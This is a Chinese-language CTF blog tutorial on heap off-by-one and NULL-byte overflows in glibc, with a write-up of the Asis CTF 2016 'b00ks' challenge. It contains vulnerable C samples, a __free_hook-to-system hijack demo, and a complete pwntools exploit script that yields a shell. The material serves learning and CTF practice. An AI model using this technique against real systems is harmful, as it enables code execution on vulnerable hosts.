---
title: offbyone
date: 2022-03-19 14:22:14
tags:
    - 堆
    - pwn
---

<!--more-->

# offbyone

## 介绍

严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。

​	off-by-one漏洞就是malloc 本来分配了0xf8的[内存](https://so.csdn.net/so/search?q=内存&spm=1001.2101.3001.7020)，结果可以写0xf9字节的数据，多写了一个，影响了下一个内存块的头部信息， 
 进而造成了被利用的可能。

## off-by-one 漏洞原理

off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括

- 使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。
- 字符串操作不合适

一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。  此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的  off-by-one 是 CTF 中比较常见的。

## off-by-one 利用思路 

1.  溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 **NULL 字节溢出的方法**
2. 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 `prev_in_use` 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 `prev_size` 域就会启用，就可以伪造 `prev_size` ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 `prev_size` 找到的块的大小与`prev_size` 是否一致。

最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。

```
/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */
      if (__glibc_unlikely (chunksize(p) != prevsize))
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
```

### offbyone示例 

```
int my_gets(char *ptr,int size)
{
    int i;
    for(i=0;i<=size;i++)//正确的应该为i<size
    {
        ptr[i]=getchar();
    }
    return i;
}
int main()
{
    void *chunk1,*chunk2;
    chunk1=malloc(16);
    chunk2=malloc(16);
    puts("Get Input:");
    my_gets(chunk1,16);
    return 0;
}
```

我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了一次

我们使用 gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为 16 字节的堆块 

```
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk2
0x602030:   0x0000000000000000  0x0000000000000000
```

 当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print 'A'*17 

```
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x0000000000000041  0x0000000000000021 <=== chunk2		#在0x602028处多了一个A
0x602030:   0x0000000000000000  0x0000000000000000
```

**我自己的推理：offbyone的溢出一个字节可以覆盖prev_size的情况下，可以使前一个堆块释放从而实现UAF或者unlink操作**

### offbynull示例 

第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误

```
int main(void)
{
    char buffer[40]="";
    void *chunk1;
    chunk1=malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer)==24)
    {
        strcpy(chunk1,buffer);
    }
    return 0;

}
```

程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。 但是  strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii  字符串长度的函数，这个函数在计算字符串长度时是不把结束符 `'\x00'` 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 `'\x00'` 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。

```
0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000411 <=== next chunk
```

在我们输入'A'*24 后执行 strcpy

```
0x602000:   0x0000000000000000  0x0000000000000021
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x4141414141414141  0x0000000000000400
```

可以看到 next chunk 的 size 域低字节被结束符 `'\x00'` 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与  NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU  的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的

```
DWORD 0x41424344
内存  0x44,0x43,0x42,0x41
```

## 例题 Asis CTF 2016

![image-20220320210148862](https://s2.loli.net/2022/03/27/xcYwm2OeCVAK7Qa.png)

### 主函数

![image-20220320210231904](https://s2.loli.net/2022/03/27/GQgcV6oUp5f1l8n.png)

存储结构

```
 control_bookid_ptr = malloc(0x20uLL);
          if ( control_bookid_ptr )
          {
            *((_DWORD *)control_bookid_ptr + 6) = size;// 4*6=0x18偏移
            *((_QWORD *)off_202010 + id) = control_bookid_ptr;
            *((_QWORD *)control_bookid_ptr + 2) = book_descriptionptr;// 8*2=0x10偏移
            *((_QWORD *)control_bookid_ptr + 1) = book_nameptr;// 0x8偏移
            *(_DWORD *)control_bookid_ptr = ++bookID;// 0偏移
            return 0LL;
```

### 漏洞点

![image-20220320144524763](https://s2.loli.net/2022/03/27/4QZsBmY9PnGca83.png)

![image-20220320144516043](https://s2.loli.net/2022/03/27/v4VKEqxkDnYe8wB.png)

这个read函数最多读取32个字符，如果不遇到截断不退出，如果刚好输入32个字符，那么截断的“\x00”也最后会算一个字符，造成offbynull，并且会把最后一个字节置为0。

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

![image-20220320210036358](https://s2.loli.net/2022/03/27/cpPQqLO3YoslZa6.png)

当我们输入32个字符是，offbynull会把book[0]`的最后一个字节覆盖为`\x00即上图c330会被覆盖为c300

![image-20220320211651692](https://s2.loli.net/2022/03/27/e8WB6wuRVZSUGhm.png)

但是可以看到c300其实是在c330的description中的，所以我们可以通过这个伪造一个book（即在c300中再构建一个book）

### 大概描述

![image-20220320215802248](https://s2.loli.net/2022/03/27/9ehtxgiZ2MDTG7n.png)

已经得到解题的所有步骤了，那么执行shell的步骤如下：

    通过libc基地址得到freehook地址，system地址，binsh地址
    由于之前已经将fakebook的description所指向的地址改为book2的name地址，所以可以通过修改book1的description来修改book2的name指针，和description指针所指向的内容。因此我们可以把book2的name改为’/bin/sh’把它的description改为’__free_hook’的地址。
    通过步骤2，我们已经把book2的description所指向的地址改成了__free_hook，因此此时修改book2的description就是修改__free_hook的地址，因此此时只要修改book2的description为system的地址。
    free(book2)
### free_hook

其实不太懂为什么要用这个函数，去搜了搜这个函数

```
void __libc_free(void *mem) {
    mstate    ar_ptr;
    mchunkptr p; /* chunk corresponding to mem */
    // 判断是否有钩子函数 __free_hook
    void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);
    if (__builtin_expect(hook != NULL, 0)) {
        (*hook)(mem, RETURN_ADDRESS(0));
        return;
    }
	//略……
}
```

当调用free函数时，会检测__free_hook函数是否为空，如果不是，则先执行__free_hook。
 研究__free_hook的内部太麻烦了，直接看__free_hook的性质：

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

extern void (*__free_hook) (void *__ptr,const void *);

int main()
{
	char *str = malloc(160);
	strcpy(str,"/bin/sh");
	
	printf("__free_hook: 0x%016X\n",__free_hook);
	// 劫持__free_hook
	__free_hook = system;

	free(str);
	return 0;
}
```

**执行结果**

```
ex@ubuntu:~/test$ gcc -o demo -g demo.c 
demo.c: In function ‘main’:
demo.c:12:9: warning: format ‘%X’ expects argument of type ‘unsigned int’, but argument 2 has type ‘void (*)(void *, const void *)’ [-Wformat=]
  printf("__free_hook: 0x%016X\n",__free_hook);
         ^
demo.c:14:14: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]
  __free_hook = system;
              ^
ex@ubuntu:~/test$ ./demo 
__free_hook: 0x0000000000000000
$ echo hello world
hello world
```

**再简单一句话概括：__free_hook执行时会把chunk中的用户数据作为参数。**

所以挟持的步骤：

1. 把__free_hook的地址改为system地址（或者直接one_gadget）
2. 把待free的chunk中的内容改为’/bin/sh’
3. 执行free(之前修改的chunk，相当于执行system)

### EXP

```
# -*- coding: utf-8 -*- 
from pwn import *
context.log_level='debug'
io = process("./b00ks")
# io=remote('node4.buuoj.cn',29695)
elf=ELF('./b00ks')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def createbook(name_size, name, des_size, des):
    io.readuntil("> ")
    io.sendline("1")
    io.readuntil(": ")
    io.sendline(str(name_size))
    io.readuntil(": ")
    io.sendline(name)
    io.readuntil(": ")
    io.sendline(str(des_size))
    io.readuntil(": ")
    io.sendline(des)

def printbook(id):
    io.readuntil("> ")
    io.sendline("4")
    io.readuntil(": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])
        io.readuntil(": ")
        book_name = io.readline()[:-1]
        io.readuntil(": ")
        book_des = io.readline()[:-1]
        io.readuntil(": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author
def createname(name):
    io.readuntil("name: ")
    io.sendline(name)

def changename(name):
    io.readuntil("> ")
    io.sendline("5")
    io.readuntil(": ")
    io.sendline(name)
def leak_address():
    return u64(io.recv(6).ljust(8,'\x00'))
def editbook(book_id, new_des):
    io.readuntil("> ")
    io.sendline("3")
    io.readuntil(": ")
    io.writeline(str(book_id))
    io.readuntil(": ")
    io.sendline(new_des)

def deletebook(book_id):
    io.readuntil("> ")
    io.sendline("2")
    io.readuntil(": ")
    io.sendline(str(book_id))
def printf():
    io.recvuntil('> ')
    io.sendline('4')
createname("a" * 32)
createbook(128, "a", 32, "a")
#gdb.attach(io)
createbook(0x21000, "a", 0x21000, "b")
# printf()
# io.recvuntil('a'*32)
# book1_addr =u64(io.recv(6)+'\x00'+'\x00')
book_id_1, book_name, book_des, book_author = printbook(1)
book1_addr = u64(book_author[32:32+6].ljust(8,'\x00'))
log.success("book1_address:" + hex(book1_addr))
#gdb.attach(io)
payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)#把book2_name_ptr和des_ptr覆盖book1
editbook(1, payload)
changename("a" * 32)
#gdb.attach(io)
printf()
io.recvuntil("Name: ")
book2_name_addr =u64(io.recv(6)+'\x00'+'\x00')
printf()
io.recvuntil("Description: ")
book2_des_addr = u64(io.recv(6).ljust(8,"\x00"))
# book_id_1, book_name, book_des, book_author = printbook(1)
# book2_name_addr = u64(book_name.ljust(8,"\x00"))
# book2_des_addr = u64(book_des.ljust(8,"\x00"))
log.success("book2 name addr:" + hex(book2_name_addr))
log.success("book2 des addr:" + hex(book2_des_addr))
#gdb.attach(io)
libc_base=book2_name_addr-0x5da010
#-------------方法一
system_addr=libc_base+libc.sym['system']
print "system_addr="+hex(system_addr)
free_hook=libc.symbols["__free_hook"]+libc_base
binsh_addr = libc.search('/bin/sh').next() + libc_base
payload = p64(binsh_addr) +  p64(free_hook)
editbook(1,payload)

payload=p64(system_addr)  #free_hook-->system_addr
editbook(2,payload)
gdb.attach(io)
deletebook(2)
#-------------方法二
# free_hook = libc_base + libc.symbols["__free_hook"]
# one_gadget = libc_base + 0x4f2a5 # 0x4f302 0x10a2fc
# log.success("free_hook:" + hex(free_hook))
# log.success("one_gadget:" + hex(one_gadget))
# editbook(1, p64(free_hook) * 2)
# editbook(2, p64(one_gadget))
# deletebook(2)


io.interactive()


```

